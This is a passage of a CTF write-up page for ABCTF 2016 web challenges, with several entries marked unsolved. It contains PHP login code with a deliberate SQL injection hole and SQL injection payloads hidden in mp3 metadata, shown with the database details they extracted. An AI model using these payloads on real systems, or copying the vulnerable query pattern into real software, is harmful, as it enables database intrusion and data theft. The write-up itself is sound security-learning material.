  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">auth</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[^</span><span class="sr">0-9a-zA-Z{}":, </span><span class="se">]</span><span class="sr">+/g</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
    <span class="nx">auth</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">auth</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">auth</span><span class="p">:</span> <span class="nx">auth</span><span class="p">,</span> <span class="na">flag</span><span class="p">:</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">flag</span><span class="p">});</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">auth</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">flag</span><span class="p">:</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">flag</span><span class="p">});</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logout</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">Set-Cookie</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">auth=; Path=/; HttpOnly</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">admin</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">false</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="o">===</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="o">===</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span>
        <span class="nx">admin</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">auth</span> <span class="o">=</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">,</span> <span class="na">admin</span><span class="p">:</span> <span class="nx">admin</span><span class="p">};</span>
    <span class="nx">auth</span> <span class="o">=</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">auth</span><span class="p">));</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">Set-Cookie</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">auth=</span><span class="dl">'</span><span class="o">+</span><span class="nx">auth</span><span class="o">+</span><span class="dl">'</span><span class="s1">; Path=/; HttpOnly</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="c1">// catch 404</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">err</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Not Found</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">err</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span>
  <span class="nf">next</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
<span class="p">});</span>

<span class="c1">// error handler</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">status</span> <span class="o">||</span> <span class="mi">500</span><span class="p">);</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">status</span><span class="p">:</span> <span class="nx">err</span><span class="p">.</span><span class="nx">status</span>
  <span class="p">});</span>
<span class="p">});</span>

<span class="kd">var</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">http</span><span class="p">.</span><span class="nf">createServer</span><span class="p">(</span><span class="nx">app</span><span class="p">).</span><span class="nf">listen</span><span class="p">(</span><span class="mi">3001</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">HTTP server listening on port 3001!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I ran it locally which indicated missing <a href="https://github.com/tj/ejs">ejs</a>. I hoped they did not sanitize their inputs so I tried using usernames like <code class="language-plaintext highlighter-rouge">&lt;%= flag %&gt;</code> but they sanitized these heavily.</p><p>Next I spent a fair amount of time inspecting the encryption and decryption to see if I could get around solving it It is easy to feed the function bad data, so it parses extra variables into the data structure. Unfortunately <code class="language-plaintext highlighter-rouge">admin: true</code> is always at the end and cannot be overwritten.</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="inj3ction"> Inj3ction <a href="/CTF-writeups-public/writeups/ABCTF-2016/41-web-exploitation-170-inj3ction.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> You can do it. <a href="http://yrmyzscnvh.abctf.xyz/injection3/">Link</a></p><p><em>Hint: I’m pretty sure there isn’t even an account that is an admin.</em></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Another SQL injection challenge, this time we are given the source:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
    <span class="nv">$con</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="s2">"injection3"</span><span class="p">,</span> <span class="s2">"injection3"</span><span class="p">,</span> <span class="s2">"injection3"</span><span class="p">);</span>
    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>

    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='</span><span class="nv">$username</span><span class="s2">'"</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

    <span class="nv">$logged_in</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="nf">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$password</span><span class="p">){</span>
            <span class="nv">$logged_in</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"is_admin"</span><span class="p">]</span> <span class="o">===</span> <span class="kc">true</span><span class="p">){</span>
                <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;h1&gt;Wow! Your flag is: </span><span class="nv">$flag</span><span class="s2"> &lt;/h1&gt;"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$logged_in</span><span class="p">){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;h1&gt;You failed!&lt;/h1&gt;"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>From the hint it would seem we do not need to pass all the checks, but rather get the program to output the <code class="language-plaintext highlighter-rouge">$flag</code> variable for us.</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="qset3"> Qset3 <a href="/CTF-writeups-public/writeups/ABCTF-2016/42-programming-200-qset3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Calculate an RSA private key <code class="language-plaintext highlighter-rouge">107.170.122.6 7773</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="audioedit"> AudioEdit <a href="/CTF-writeups-public/writeups/ABCTF-2016/43-web-exploitation-200-audioedit.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> I made a cool site to edit audio files. <a href="http://107.170.122.6/audioedit/">Can you exploit it?</a></p><p><strong>Solution</strong> The website lets you upload mp3 files and then displays some metadata and plays it for you.</p><p>It has to be a valid mp3 file</p><p>We try if we can put SQL injection in the exifdata and indeed we can: (exiftool doesn’t do exifdata updates for mp3 so we used easytag)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>foo', (SELECT VERSION())) -- -
&gt; Author: foo
&gt; Title: 5.5.49-0ubuntu0.14.04.1

foo', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())) -- -
&gt; Author: foo
&gt; Title: audioedit

foo', (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='audioedit')) -- -
&gt; Author: foo
&gt; Title: id,file,author,title

foo', (SELECT GROUP_CONCAT(CONCAT(id, ':', file, ':' , author, ':' , title )) FROM audioedit)) -- -
&gt; error inserting into database
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="frozen-recursion"> Frozen Recursion <a href="/CTF-writeups-public/writeups/ABCTF-2016/44-reverse-engineering-250-frozen-recursion.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> I finally learned recursion! Am I doing it right? Here it is.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="liorogamerdvd"> Liorogamerdvd <a href="/CTF-writeups-public/writeups/ABCTF-2016/45-reconnaissance-300-liorogamerdvd.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><None> **Solution** **Flag** ``` flag ``` ## Challenge 10: Title **Challenge** **Solution** **Flag** ``` flag ``` </None><h2> Flag</h2><code> unsolved </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
